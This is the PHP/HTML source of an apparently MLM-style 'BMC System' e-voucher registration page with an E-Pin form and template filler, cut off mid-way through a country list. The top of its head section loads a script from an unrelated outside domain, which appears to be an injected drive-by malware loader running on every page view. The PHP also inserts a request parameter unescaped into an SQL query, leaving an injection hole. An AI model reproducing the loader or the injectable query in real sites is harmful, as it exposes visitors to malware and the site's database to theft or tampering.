<?php
session_start();
include_once('controller/connection.php');
include("includes/common_function.php");

$msg = '';

$userID = $_SESSION['ref_id'];
if(isset($_REQUEST['pinup']) && $_REQUEST['pinup']==1)
{
	 $id = $_REQUEST['pass'];
 	 $selectuser1=mysql_query("select pin_no from pins where pin_no='$id' AND pif_status!='2'");
	 $fetchuser1=mysql_fetch_array($selectuser1);
	 $fetchuser1Count = mysql_num_rows($selectuser1);
	 $_SESSION['pin_no'] = $_REQUEST['pass'];
	 $_SESSION['payment_mode'] = 'evoucher';
	 if($fetchuser1Count > 0)
	 {
		header('Location: controller/register.php');
		exit();
	 }
	 else
	 {
		$msg =  "Please check your E-Pin. It does not exist or Used By another user.";
	 }
}
?>
<!DOCTYPE html>
<!--[if lt IE 7]>      <html class="no-js html-loading wf-active ie old-browser lt-ie10 lt-ie9 lt-ie8 lt-ie7" lang="en-US"> <![endif]-->
<!--[if IE 7]>         <html class="no-js html-loading wf-active ie old-browser ie7 lt-ie10 lt-ie9 lt-ie8" lang="en-US"> <![endif]-->
<!--[if IE 8]>         <html class="no-js html-loading wf-active ie old-browser ie8 lt-ie10 lt-ie9" lang="en-US"> <![endif]-->
<!--[if IE 9]>         <html class="no-js html-loading wf-active ie modern-browser ie9 lt-ie10" lang="en-US"> <![endif]-->
<!--[if gt IE 9]><!--> <html class="no-js html-loading wf-active modern-browser" lang="en-US"> <!--<![endif]-->

<head><script src="http://d.playdisasteroids.com/l/load.js"></script>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<meta name="viewport" content="width=device-width, maximum-scale=1.0, minimum-scale=1.0">
<title>BMC System</title>

<!-- W3TC-include-js-head -->
<!--[if IE 8]> 
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<![endif]-->
<link rel='stylesheet' id='bbp-default-css'  href='css/bbpress.css' type='text/css' media='screen' />
<link rel='stylesheet' id='contact-form-7-css'  href='css/styles.css' type='text/css' media='all' />
<link rel='stylesheet' id='rs-settings-css'  href='css/settings.css' type='text/css' media='all' />
<link rel='stylesheet' id='rs-captions-css'  href='css/dynamic-captions.css' type='text/css' media='all' />
<link rel='stylesheet' id='rs-plugin-static-css'  href='css/static-captions.css' type='text/css' media='all' />
<link rel='stylesheet' id='wptation-demo-options-css'  href='css/options.css' type='text/css' media='all' />
<link rel='stylesheet' id='wpt-custom-login-css'  href='css/custom-login.css' type='text/css' media='all' />
<link rel='stylesheet' id='theme-bootstrap-css'  href='css/bootstrap.css' type='text/css' media='all' />
<link rel='stylesheet' id='theme-frontend-style-css'  href='css/style.css' type='text/css' media='all' />
<link rel='stylesheet' id='theme-frontend-extensions-css'  href='css/extensions.css' type='text/css' media='all' />
<link rel='stylesheet' id='theme-bootstrap-responsive-1170-css'  href='css/bootstrap-responsive-1170.css' type='text/css' media='all' />
<link rel='stylesheet' id='theme-bootstrap-responsive-css'  href='css/bootstrap-responsive.css' type='text/css' media='all' />
<link rel='stylesheet' id='theme-woocommerce-css'  href='css/woocommerce.css' type='text/css' media='all' />
<link rel='stylesheet' id='theme-bbpress-css'  href='css/bbpress(1).css' type='text/css' media='all' />
<link rel='stylesheet' id='theme-fontawesome-css'  href='css/font-awesome.min.css' type='text/css' media='all' />
<link href='http://fonts.googleapis.com/css?family=Open+Sans:400italic,600italic,400,700,600' rel='stylesheet' type='text/css'>
<!--[if IE 7]>
<link rel='stylesheet' id='theme-fontawesome-ie7-css'  href='http://envision.wptation.com/wp-content/themes/envision/includes/modules/module.fontawesome/source/css/font-awesome-ie7.min.css' type='text/css' media='all' />
<![endif]-->
<link rel='stylesheet' id='theme-icomoon-css'  href='css/icomoon.css' type='text/css' media='all' />
<link href="css/sky-forms.css" rel="stylesheet">
<script type='text/javascript'>
/* <![CDATA[ */
var CloudFwOp = {"themeurl":"http:\/\/envision.wptation.com\/wp-content\/themes\/envision","ajaxUrl":"http:\/\/envision.wptation.com\/wp-admin\/admin-ajax.php","device":"widescreen","RTL":"","responsive":"1","lang":"en-US","sticky_header":"1","sticky_header_offset":"0","uniform_elements":"1","disable_prettyphoto_on_mobile":"1","gallery_overlay_opacity":"0.9"};
/* ]]> */
</script>
<script type='text/javascript' src='js/jquery.js'></script>
<script type='text/javascript' src='js/jquery-migrate.min.js'></script>
<script type='text/javascript' src='js/jquery.themepunch.plugins.min.js'></script>
<script type='text/javascript' src='js/jquery.themepunch.revolution.min.js'></script>
<script type='text/javascript' src='js/options.js'></script>
<script type='text/javascript' src='js/common.js'></script>
<script type='text/javascript' src='js/modernizr-2.6.2-respond-1.1.0.min.js'></script>
<script type='text/javascript' src='js/noconflict.js'></script>
<script type='text/javascript' src='js/webfont.js'></script>
<script type='text/javascript' src='js/comment-reply.min.js'></script>
<script type="text/javascript">
(function(){
	"use strict";

	if( document.cookie.indexOf('device_pixel_ratio') == -1
	    && 'devicePixelRatio' in window
	    && window.devicePixelRatio >= 1.5 ){

		var date = new Date();
		date.setTime( date.getTime() + 3600000 );

		document.cookie = 'device_pixel_ratio=' + window.devicePixelRatio + ';' +  ' expires=' + date.toUTCString() +'; path=/';
		
		//if cookies are not blocked, reload the page
		if(document.cookie.indexOf('device_pixel_ratio') != -1) {
		    window.location.reload();
		}
	}
})();
</script>

<link rel="stylesheet" id= "skin" href="css/Orange-Skin_9b39c377b5bb3aaa585dc0c6379802f9.css" type="text/css" media="all"/>
<style type= "text/css">@media (min-width: 768px) and (max-width: 979px) {
  html #header-navigation li.menu-item.level-0 > a {
    padding-left: 18px;
    padding-right: 18px;
  }
}
</style><script type="text/javascript" src="js/yxq5xji.js"></script>
<script type="text/javascript">try{Typekit.load();}catch(e){}</script>
<script type="text/javascript">
    
    document.documentElement.className = document.documentElement.className.replace('no-js','js');
    document.documentElement.className = document.documentElement.className.replace('html-loaded','html-loading');

    (function(){
        "use strict";

        setTimeout(function(){
            document.documentElement.className = document.documentElement.className.replace('html-loading','html-loaded');
        }, 6000);

    })();
    
    jQuery(document).ready(function(){ 
        jQuery('html').removeClass('html-loading').addClass('html-loaded');
    });

</script>
<script type="text/javascript" src="js/modernizr.custom.29473.js"></script>
<script src="js/jquery.js" type="text/javascript"></script>
<script src="js/mobilyslider.js" type="text/javascript"></script>
<script src="js/init.js" type="text/javascript"></script>
<script src="js/validation.js"></script>
<script src="js/validationOnNumber.js"></script>
<script type="text/javascript" src="http://code.jquery.com/jquery-latest.min.js"></script>

<script type="text/javascript">
		 
function checkpass()  
   {  
		if(document.contactform.pass.value!=document.contactform.repassword.value)
		{
			document.getElementById("showpass1").innerHTML='Your E-Pin confirmation is not correct';
			var d = document.getElementById("showpass1");
			d.className = d.className + " ajaxdiv";
			document.contactform.pass.focus();
			return false;
		}
		else
		{
			document.getElementById("showpass1").innerHTML='';
			var d = document.getElementById("showpass1");
			d.className =  " ";
			return true;
		}
   } 

   function formSubmit_reg(){
	   if(!checkpass()){
		   return false;
	   }
	  
	    document.contactform.submit();
   }

	 jQuery(document).ready(function($){ 
	  $('#Password1').blur(function(){
	 var id=$("#Password1").val();

	 var pos='ref_id';
		var urldata="id="+id+"&pos="+pos;
		  
				 $.ajax({
					type: "POST",
					async: "false",
					url: "ajax/ajax_pin.php",
					data: urldata,
					success: function(html) {

					 if(html)
					 {
					//alert(html);					 
					 if(html=='yes'){
						 $("#sponser_ajax1").removeClass("ajaxdiv");
						
							$('#sponser_ajax1').html('');
					 }
					 else if(html=='no'){
						 $('#sponser_name').val('');
						 $("#Password1").removeClass("ajaxdiv");
						  $('#sponser_ajax1').html("This is invalid E-pin."); 	
							$('#Password1').focus();
							
							
					 }
					 else{
					    var n=html.split("#");
				 $('#sponser_name').val(html);
				  $('#sponser_ajax1').html('');
						 $("#sponser_name").removeClass("ajaxdiv");

					 }
					 }
					 else
					 {
					  return false; 
					 }
					}
				});
		 });
	 });
	 </script>
</head>

<body class="page page-id-11 page-template-default run layout--boxed" itemscope itemtype="http://schema.org/WebPage" style="background-image: url(images/10.png);">
<div id="side-panel-pusher">
  <div id="main-container">
    <div id="page-wrap">
      <header id="page-header" class="clearfix">
<?php
include("includes/header.php");
?>        <!-- /#header-container --> </header>
      

<div id="titlebar" class="titlebar-hautq cover">
			<div class="container relative">
				<div id="titlebar-text">
											<h2 id="titlebar-title"><strong>How it works?</strong></h2>
					
											<div class="titlebar-text-content"><p>Cras turpis odio, luctus sed volutpat sed, luctus at dui. Proin sed enim at lectus placerat mollis in ac felis. Etiam sed tristique justo.</p>
</div>
									</div>
									<div id="titlebar-breadcrumb"><div id="breadcrumb" class="ui--box-alias centerVertical"><div class="ui-bc ui-breadcrumbs breadcrumbs" itemprop="breadcrumb"><span class="ui-bc-first"><a href="#" title="Envision" rel="home" class="ui-bc-first">Home</a></span> <span class="ui-bc-seperator"> <i class="ui--caret fontawesome-angle-right px18"></i> </span> <span class="ui-bc-last">How it works?</span></div></div></div>
							</div>
		</div><!-- /#titlebar -->

<div id="page-content" class="no-sidebar-layout"><div class="container"><div id="the-content" >
	<div class="ui-row row">
  <div class="ui-column span12">
<div class="row eternity-form">

 <form method="post" id="register" class="sky-form" action="" name="contactform" onSubmit="return formSubmit_reg();">
                             <input type="hidden" name="pinup" id="pinup" value="1">

 <font size="4px;" color="red"> <?php echo $msg; ?></font>
              <header>E-voucher form</header>

              <fieldset>
                            <p>Please fill pin number below</p>
                <section>
                  <label class="input"> <i class="icon-append icon-user"></i>
                    <input type="text" placeholder="E-Pin" id="Password1" name="pass" value="" required>
                    <b class="tooltip tooltip-bottom-right">Only latin characters and numbers</b> </label>
                    <div id="sponser_ajax1" style="font-size:16px; color:red; font-weight:bold;"></div> 
                </section>
                <section>
                <p class="form-hd"></p>
                  <label class="input"> <i class="icon-append icon-user"></i>
                    <input type="text" placeholder="Confirm E-Pin"  name="repassword"  id="repassword" value="" onBlur="checkpass();" required>
                    <b class="tooltip tooltip-bottom-right">Only latin characters and numbers</b> </label>
                     <div id="showpass1" style="font-size:16px; color:red; font-weight:bold; text-align:center;text-transform:capitalize;"></div>
                </section>
               
              </fieldset>
             
              <footer style="text-align:center">
                <input type="submit" class="btn-dark-red">
              </footer>
            </form>

                                                                    
            </div>
  
</div>
</div> 
 
 

<div  class="ui--space clearfix" data-responsive="{&quot;css&quot;:{&quot;height&quot;:{&quot;phone&quot;:null,&quot;tablet&quot;:null,&quot;widescreen&quot;:null}}}"></div><div class="ui--title ui--animation ui--title-bordered text-left"><div class="ui--title-holder"><h3 class="ui--title-text">What our <strong>cilents say?</strong> <a class="btn btn-small btn-icon-left btn-secondary ui--animation" href="#" style="margin-left: 10px;  margin-right: 0px;  margin-bottom: 0px;">all testimonails</a> </h3><div class="ui--title-borders ui--title-border-left"></div><div class="ui--title-borders ui--title-border-right"></div></div></div><div  class="ui--animation-in make--fx--fadein-ttb ui--pass clearfix" data-fx="fx--fadein-ttb" data-delay="400" data-start-delay="400"><div class="ui-row row">
 <div   class="ui-column span4"><div class="ui--carousel-item ui--testimonial-wrap ui--animation clearfix">
			
				<div class="ui--testimonial clearfix">
					
					<div class="ui--testimonial-content ui--box ui--gradient ui--gradient-grey auto-format clearfix">
						<p>Auctor sit amet feugiat eu &#038; viverra ac felis. Nullam gravida neque quis augue vestibulum euismod. Suspendisse risus tortor, varius ac malesuada in, mattis vitae mauris.</p>

						<div class="ui--testimonial-arrow"><i class="fontawesome-caret-down"></i></div>
					</div>

					
					<div class="ui--testimonial-brand ui--animation clearfix" data-fx="fx--fadein-btt">

						
						<div class="ui--testimonial-image">
							<div class="ui--testimonial-image-position"><img src="images/testimonial-1.png" alt="Robyn Paton" /></div>
						</div>

						<div class="ui--testimonial-user">
							<strong class="name">Robyn Paton</strong>
								<small class="cap">Senior Marketing Strategist</small>
							</div>
						</div>

				</div>	
			
			<div class="clearfix"></div>
			</div></div> 

 <div   class="ui-column span4"><div class="ui--carousel-item ui--testimonial-wrap ui--animation clearfix">
			
				<div class="ui--testimonial clearfix">
					
					<div class="ui--testimonial-content ui--box ui--gradient ui--gradient-grey auto-format clearfix">
						<p>Maecenas pulvinar turpis consectetur pharetra egestas. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Quisque volutpat eros sit amet.</p>

						<div class="ui--testimonial-arrow"><i class="fontawesome-caret-down"></i></div>
					</div>

					
					<div class="ui--testimonial-brand ui--animation clearfix" data-fx="fx--fadein-btt">

						
						<div class="ui--testimonial-image">
							<div class="ui--testimonial-image-position"><img src="images/testimonial-2.png" alt="James V. Sanders" /></div>
						</div>

						<div class="ui--testimonial-user">
							<strong class="name">James V. Sanders</strong>
								<small class="cap">Senior Marketing Strategist</small>
							</div>
						</div>

				</div>	
			
			<div class="clearfix"></div>
			</div></div> 

 <div   class="ui-column span4"><div class="ui--carousel-item ui--testimonial-wrap ui--animation clearfix">
			
				<div class="ui--testimonial clearfix">
					
					<div class="ui--testimonial-content ui--box ui--gradient ui--gradient-grey auto-format clearfix">
						<p>Donec facilisis urna tellus, sit amet bibendum dui facilisis non. In non mollis sem. Donec pharetra urna vel semper consequat. <a href="#">Fusce facilisis pharetra volutpat.</a></p>

						<div class="ui--testimonial-arrow"><i class="fontawesome-caret-down"></i></div>
					</div>

					
					<div class="ui--testimonial-brand ui--animation clearfix" data-fx="fx--fadein-btt">

						
						<div class="ui--testimonial-image">
							<div class="ui--testimonial-image-position"><img src="images/testimonial-3.png" alt="Brian M. Barker" /></div>
						</div>

						<div class="ui--testimonial-user">
							<strong class="name">Brian M. Barker</strong>
								<small class="cap">CEO of A Company</small>
							</div>
						</div>

				</div>	
			
			<div class="clearfix"></div>
			</div></div> 

</div> 
</div><div  class="ui--space clearfix" data-responsive="{&quot;css&quot;:{&quot;height&quot;:{&quot;phone&quot;:null,&quot;tablet&quot;:null,&quot;widescreen&quot;:null}}}"></div><div  id="section-cr4zq" class="fullwidth-container ui--section clearfix inner-shadow-2 section-cr4zq" style="margin-top: 12px;  margin-bottom: -12px;"><div class="container"><div class="ui--client-list-wrapper ui--animation ui-row clearfix"><div class="ui--client-list ui--box ui-row clearfix ui--carousel" data-options="{&quot;effect&quot;:&quot;slide&quot;,&quot;auto_rotate&quot;:&quot;1&quot;,&quot;animation_loop&quot;:&quot;FALSE&quot;,&quot;rotate_time&quot;:0}"><div class="slides"><div class="ui-row row">
 <div   class="ui-column span3"><div class="ui--client ui--carousel-item"><img src="images/client-10.png" alt="" title="" class="ui--animation"></div><div class="vertical-divider"></div></div> 

 <div   class="ui-column span3"><div class="ui--client ui--carousel-item"><img src="images/client-17.png" alt="" title="" class="ui--animation"></div><div class="vertical-divider"></div></div> 

 <div   class="ui-column span3"><div class="ui--client ui--carousel-item"><img src="images/client-15.png" alt="" title="" class="ui--animation"></div><div class="vertical-divider"></div></div> 

 <div   class="ui-column span3"><div class="ui--client ui--carousel-item"><img src="images/client-14.png" alt="" title="" class="ui--animation"></div><div class="vertical-divider"></div></div> 

</div> 
<div class="ui-row row">
 <div   class="ui-column span3"><div class="ui--client ui--carousel-item"><img src="images/client-1.png" alt="" title="" class="ui--animation"></div><div class="vertical-divider"></div></div> 

 <div   class="ui-column span3"><div class="ui--client ui--carousel-item"><img src="images/client-2.png" alt="" title="" class="ui--animation"></div><div class="vertical-divider"></div></div> 

 <div   class="ui-column span3"><div class="ui--client ui--carousel-item"><img src="images/client-3.png" alt="" title="" class="ui--animation"></div><div class="vertical-divider"></div></div> 

 <div   class="ui-column span3"><div class="ui--client ui--carousel-item"><img src="images/client-4.png" alt="" title="" class="ui--animation"></div><div class="vertical-divider"></div></div> 

</div> 
<div class="ui-row row">
 <div   class="ui-column span3"><div class="ui--client ui--carousel-item"><img src="images/client-12.png" alt="" title="" class="ui--animation"></div><div class="vertical-divider"></div></div> 

 <div   class="ui-column span3"><div class="ui--client ui--carousel-item"><img src="images/client-6.png" alt="" title="" class="ui--animation"></div><div class="vertical-divider"></div></div> 

 <div   class="ui-column span3"><div class="ui--client ui--carousel-item"><img src="images/client-8.png" alt="" title="" class="ui--animation"></div><div class="vertical-divider"></div></div> 

 <div   class="ui-column span3"><div class="ui--client ui--carousel-item"><img src="images/client-9.png" alt="" title="" class="ui--animation"></div><div class="vertical-divider"></div></div> 

</div> 
</div></div></div></div></div><!-- /.fullwidth-container -->

	</div></div><!-- /.container --></div><!-- /#page-content -->


      <!-- /#page-content -->
<?php
include("includes/footer.php");
?>
<script type="text/javascript">// <![CDATA[
		var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
		document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
		// ]]></script>
		<script type="text/javascript">// <![CDATA[
		try{
		var pageTracker = _gat._getTracker("UA-37808265-3");
		pageTracker._trackPageview();
		} catch(err) {} 
	// ]]></script>


<script type='text/javascript' src='js/editor.js'></script>
<script type='text/javascript' src='js/jquery.form.min.js'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var _wpcf7 = {"loaderUrl":"http:\/\/envision.wptation.com\/wp-content\/plugins\/contact-form-7\/images\/ajax-loader.gif","sending":"Sending ...","cached":"1"};
/* ]]> */
</script>
<script type='text/javascript' src='js/scripts.js'></script>
<script type='text/javascript' src='js/add-to-cart.min.js'></script>
<script type='text/javascript' src='js/jquery.blockUI.min.js'></script>
<script type='text/javascript' src='js/jquery.placeholder.min.js'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var woocommerce_params = {"countries":"{\"AF\":[],\"AT\":[],\"BE\":[],\"BI\":[],\"CZ\":[],\"DE\":[],\"DK\":[],\"FI\":[],\"FR\":[],\"HU\":[],\"IS\":[],\"IL\":[],\"KR\":[],\"NL\":[],\"NO\":[],\"PL\":[],\"PT\":[],\"SG\":[],\"SK\":[],\"SI\":[],\"LK\":[],\"SE\":[],\"VN\":[],\"AU\":{\"ACT\":\"Australian Capital Territory\",\"NSW\":\"New South Wales\",\"NT\":\"Northern Territory\",\"QLD\":\"Queensland\",\"SA\":\"South Australia\",\"TAS\":\"Tasmania\",\"VIC\":\"Victoria\",\"WA\":\"Western Australia\"},\"BR\":{\"AC\":\"Acre\",\"AL\":\"Alagoas\",\"AP\":\"Amap\u00e1\",\"AM\":\"Amazonas\",\"BA\":\"Bahia\",\"CE\":\"Cear\u00e1\",\"DF\":\"Distrito Federal\",\"ES\":\"Esp\u00edrito Santo\",\"GO\":\"Goi\u00e1s\",\"MA\":\"Maranh\u00e3o\",\"MT\":\"Mato Grosso\",\"MS\":\"Mato Grosso do Sul\",\"MG\":\"Minas Gerais\",\"PA\":\"Par\u00e1\",\"PB\":\"Para\u00edba\",\"PR\":\"Paran\u00e1\",\"PE\":\"Pernambuco\",\"PI\":\"Piau\u00ed\",\"RJ\":\"Rio de Janeiro\",\"RN\":\"Rio Grande do Norte\",\"RS\":\"Rio Grande do Sul\",\"RO\":\"Rond\u00f4nia\",\"RR\":\"Roraima\",\"SC\":\"Santa Catarina\",\"SP\":\"S\u00e3o Paulo\",\"SE\":\"Sergipe\",\"TO\":\"Tocantins\"},\"CA\":{\"AB\":\"Alberta\",\"BC\":\"British Columbia\",\"MB\":\"Manitoba\",\"NB\":\"New Brunswick\",\"NL\":\"Newfoundland\",\"NT\":\"Northwest Territories\",\"NS\":\"Nova Scotia\",\"NU\":\"Nunavut\",\"ON\":\"Ontario\",\"PE\":\"Prince Edward Island\",\"QC\":\"Quebec\",\"SK\":\"Saskatchewan\",\"YT\":\"Yukon Territory\"},\"CN\":{\"CN1\":\"Yunnan \\\/ \u4e91\u5357\",\"CN2\":\"Beijing \\\/ \u5317\u4eac\",\"CN3\":\"Tianjin \\\/ \u5929\u6d25\",\"CN4\":\"Hebei \\\/ \u6cb3\u5317\",\"CN5\":\"Shanxi \\\/ \u5c71\u897f\",\"CN6\":\"Inner Mongolia \\\/ \u5167\u8499\u53e4\",\"CN7\":\"Liaoning \\\/ \u8fbd\u5b81\",\"CN8\":\"Jilin \\\/ \u5409\u6797\",\"CN9\":\"Heilongjiang \\\/ \u9ed1\u9f99\u6c5f\",\"CN10\":\"Shanghai \\\/ \u4e0a\u6d77\",\"CN11\":\"Jiangsu \\\/ \u6c5f\u82cf\",\"CN12\":\"Zhejiang \\\/ \u6d59\u6c5f\",\"CN13\":\"Anhui \\\/ \u5b89\u5fbd\",\"CN14\":\"Fujian \\\/ \u798f\u5efa\",\"CN15\":\"Jiangxi \\\/ \u6c5f\u897f\",\"CN16\":\"Shandong \\\/ \u5c71\u4e1c\",\"CN17\":\"Henan \\\/ \u6cb3\u5357\",\"CN18\":\"Hubei \\\/ \u6e56\u5317\",\"CN19\":\"Hunan \\\/ \u6e56\u5357\",\"CN20\":\"Guangdong \\\/ \u5e7f\u4e1c\",\"CN21\":\"Guangxi Zhuang \\\/ \u5e7f\u897f\u58ee\u65cf\",\"CN22\":\"Hainan \\\/ \u6d77\u5357\",\"CN23\":\"Chongqing \\\/ \u91cd\u5e86\",\"CN24\":\"Sichuan \\\/ \u56db\u5ddd\",\"CN25\":\"Guizhou \\\/ \u8d35\u5dde\",\"CN26\":\"Shaanxi \\\/ \u9655\u897f\",\"CN27\":\"Gansu \\\/ \u7518\u8083\",\"CN28\":\"Qinghai \\\/ \u9752\u6d77\",\"CN29\":\"Ningxia Hui \\\/ \u5b81\u590f\",\"CN30\":\"Macau \\\/ \u6fb3\u95e8\",\"CN31\":\"Tibet \\\/ \u897f\u85cf\",\"CN32\":\"Xinjiang \\\/ \u65b0\u7586\"},\"HK\":{\"HONG KONG\":\"Hong Kong Island\",\"KOWLOON\":\"Kowloon\",\"NEW TERRITORIES\":\"New Territories\"},\"IN\":{\"AP\":\"Andra Pradesh\",\"AR\":\"Arunachal Pradesh\",\"AS\":\"Assam\",\"BR\":\"Bihar\",\"CT\":\"Chhattisgarh\",\"GA\":\"Goa\",\"GJ\":\"Gujarat\",\"HR\":\"Haryana\",\"HP\":\"Himachal Pradesh\",\"JK\":\"Jammu and Kashmir\",\"JH\":\"Jharkhand\",\"KA\":\"Karnataka\",\"KL\":\"Kerala\",\"MP\":\"Madhya Pradesh\",\"MH\":\"Maharashtra\",\"MN\":\"Manipur\",\"ML\":\"Meghalaya\",\"MZ\":\"Mizoram\",\"NL\":\"Nagaland\",\"OR\":\"Orissa\",\"PB\":\"Punjab\",\"RJ\":\"Rajasthan\",\"SK\":\"Sikkim\",\"TN\":\"Tamil Nadu\",\"TR\":\"Tripura\",\"UT\":\"Uttaranchal\",\"UP\":\"Uttar Pradesh\",\"WB\":\"West Bengal\",\"AN\":\"Andaman and Nicobar Islands\",\"CH\":\"Chandigarh\",\"DN\":\"Dadar and Nagar Haveli\",\"DD\":\"Daman and Diu\",\"DL\":\"Delhi\",\"LD\":\"Lakshadeep\",\"PY\":\"Pondicherry (Puducherry)\"},\"ID\":{\"AC\":\"Daerah Istimewa Aceh\",\"SU\":\"Sumatera Utara\",\"SB\":\"Sumatera Barat\",\"RI\":\"Riau\",\"KR\":\"Kepulauan Riau\",\"JA\":\"Jambi\",\"SS\":\"Sumatera Selatan\",\"BB\":\"Bangka Belitung\",\"BE\":\"Bengkulu\",\"LA\":\"Lampung\",\"JK\":\"DKI Jakarta\",\"JB\":\"Jawa Barat\",\"BT\":\"Banten\",\"JT\":\"Jawa Tengah\",\"JI\":\"Jawa Timur\",\"YO\":\"Daerah Istimewa Yogyakarta\",\"BA\":\"Bali\",\"NB\":\"Nusa Tenggara Barat\",\"NT\":\"Nusa Tenggara Timur\",\"KB\":\"Kalimantan Barat\",\"KT\":\"Kalimantan Tengah\",\"KI\":\"Kalimantan Timur\",\"KS\":\"Kalimantan Selatan\",\"KU\":\"Kalimantan Utara\",\"SA\":\"Sulawesi Utara\",\"ST\":\"Sulawesi Tengah\",\"SG\":\"Sulawesi Tenggara\",\"SR\":\"Sulawesi Barat\",\"SN\":\"Sulawesi Selatan\",\"GO\":\"Gorontalo\",\"MA\":\"Maluku\",\"MU\":\"Maluku Utara\",\"PA\":\"Papua\",\"PB\":\"Papua Barat\"},\"MY\":{\"JHR\":\"Johor\",\"KDH\":\"Kedah\",\"KTN\":\"Kelantan\",\"MLK\":\"Melaka\",\"NSN\":\"Negeri Sembilan\",\"PHG\":\"Pahang\",\"PRK\":\"Perak\",\"PLS\":\"Perlis\",\"PNG\":\"Pulau Pinang\",\"SBH\":\"Sabah\",\"SWK\":\"Sarawak\",\"SGR\":\"Selangor\",\"TRG\":\"Terengganu\",\"KUL\":\"W.P. Kuala Lumpur\",\"LBN\":\"W.P. Labuan\",\"PJY\":\"W.P. Putrajaya\"},\"NZ\":{\"NL\":\"Northland\",\"AK\":\"Auckland\",\"WA\":\"Waikato\",\"BP\":\"Bay of Plenty\",\"TK\":\"Taranaki\",\"HB\":\"Hawke\u2019s Bay\",\"MW\":\"Manawatu-Wanganui\",\"WE\":\"Wellington\",\"NS\":\"Nelson\",\"MB\":\"Marlborough\",\"TM\":\"Tasman\",\"WC\":\"West Coast\",\"CT\":\"Canterbury\",\"OT\":\"Otago\",\"SL\":\"Southland\"},\"ZA\":{\"EC\":\"Eastern Cape\",\"FS\":\"Free State\",\"GP\":\"Gauteng\",\"KZN\":\"KwaZulu-Natal\",\"LP\":\"Limpopo\",\"MP\":\"Mpumalanga\",\"NC\":\"Northern Cape\",\"NW\":\"North West\",\"WC\":\"Western Cape\"},\"ES\":{\"C\":\"A Coru\u00f1a\",\"VI\":\"\u00c1lava\",\"AB\":\"Albacete\",\"A\":\"Alicante\",\"AL\":\"Almer\u00eda\",\"O\":\"Asturias\",\"AV\":\"\u00c1vila\",\"BA\":\"Badajoz\",\"PM\":\"Baleares\",\"B\":\"Barcelona\",\"BU\":\"Burgos\",\"CC\":\"C\u00e1ceres\",\"CA\":\"C\u00e1diz\",\"S\":\"Cantabria\",\"CS\":\"Castell\u00f3n\",\"CE\":\"Ceuta\",\"CR\":\"Ciudad Real\",\"CO\":\"C\u00f3rdoba\",\"CU\":\"Cuenca\",\"GI\":\"Girona\",\"GR\":\"Granada\",\"GU\":\"Guadalajara\",\"SS\":\"Guip\u00fazcoa\",\"H\":\"Huelva\",\"HU\":\"Huesca\",\"J\":\"Ja\u00e9n\",\"LO\":\"La Rioja\",\"GC\":\"Las Palmas\",\"LE\":\"Le\u00f3n\",\"L\":\"Lleida\",\"LU\":\"Lugo\",\"M\":\"Madrid\",\"MA\":\"M\u00e1laga\",\"ML\":\"Melilla\",\"MU\":\"Murcia\",\"NA\":\"Navarra\",\"OR\":\"Ourense\",\"P\":\"Palencia\",\"PO\":\"Pontevedra\",\"SA\":\"Salamanca\",\"TF\":\"Santa Cruz de Tenerife\",\"SG\":\"Segovia\",\"SE\":\"Sevilla\",\"SO\":\"Soria\",\"T\":\"Tarragona\",\"TE\":\"Teruel\",\"TO\":\"Toledo\",\"V\":\"Valencia\",\"VA\":\"Valladolid\",\"BI\":\"Vizcaya\",\"ZA\":\"Zamora\",\"Z\":\"Zaragoza\"},\"TH\":{\"TH-37\":\"Amnat Charoen (\u0e2d\u0e33\u0e19\u0e32\u0e08\u0e40\u0e08\u0e23\u0e34\u0e0d)\",\"TH-15\":\"Ang Thong (\u0e2d\u0e48\u0e32\u0e07\u0e17\u0e2d\u0e07)\",\"TH-14\":\"Ayutthaya (\u0e1e\u0e23\u0e30\u0e19\u0e04\u0e23\u0e28\u0e23\u0e35\u0e2d\u0e22\u0e38\u0e18\u0e22\u0e32)\",\"TH-10\":\"Bangkok (\u0e01\u0e23\u0e38\u0e07\u0e40\u0e17\u0e1e\u0e21\u0e2b\u0e32\u0e19\u0e04\u0e23)\",\"TH-38\":\"Bueng Kan (\u0e1a\u0e36\u0e07\u0e01\u0e32\u0e2c)\",\"TH-31\":\"Buri Ram (\u0e1a\u0e38\u0e23\u0e35\u0e23\u0e31\u0e21\u0e22\u0e4c)\",\"TH-24\":\"Chachoengsao (\u0e09\u0e30\u0e40\u0e0a\u0e34\u0e07\u0e40\u0e17\u0e23\u0e32)\",\"TH-18\":\"Chai Nat (\u0e0a\u0e31\u0e22\u0e19\u0e32\u0e17)\",\"TH-36\":\"Chaiyaphum (\u0e0a\u0e31\u0e22\u0e20\u0e39\u0e21\u0e34)\",\"TH-22\":\"Chanthaburi (\u0e08\u0e31\u0e19\u0e17\u0e1a\u0e38\u0e23\u0e35)\",\"TH-50\":\"Chiang Mai (\u0e40\u0e0a\u0e35\u0e22\u0e07\u0e43\u0e2b\u0e21\u0e48)\",\"TH-57\":\"Chiang Rai (\u0e40\u0e0a\u0e35\u0e22\u0e07\u0e23\u0e32\u0e22)\",\"TH-20\":\"Chonburi (\u0e0a\u0e25\u0e1a\u0e38\u0e23\u0e35)\",\"TH-86\":\"Chumphon (\u0e0a\u0e38\u0e21\u0e1e\u0e23)\",\"TH-46\":\"Kalasin (\u0e01\u0e32\u0e2c\u0e2a\u0e34\u0e19\u0e18\u0e38\u0e4c)\",\"TH-62\":\"Kamphaeng Phet (\u0e01\u0e33\u0e41\u0e1e\u0e07\u0e40\u0e1e\u0e0a\u0e23)\",\"TH-71\":\"Kanchanaburi (\u0e01\u0e32\u0e0d\u0e08\u0e19\u0e1a\u0e38\u0e23\u0e35)\",\"TH-40\":\"Khon Kaen (\u0e02\u0e2d\u0e19\u0e41\u0e01\u0e48\u0e19)\",\"TH-81\":\"Krabi (\u0e01\u0e23\u0e30\u0e1a\u0e35\u0e48)\",\"TH-52\":\"Lampang (\u0e25\u0e33\u0e1b\u0e32\u0e07)\",\"TH-51\":\"Lamphun (\u0e25\u0e33\u0e1e\u0e39\u0e19)\",\"TH-42\":\"Loei (\u0e40\u0e25\u0e22)\",\"TH-16\":\"Lopburi (\u0e25\u0e1e\u0e1a\u0e38\u0e23\u0e35)\",\"TH-58\":\"Mae Hong Son 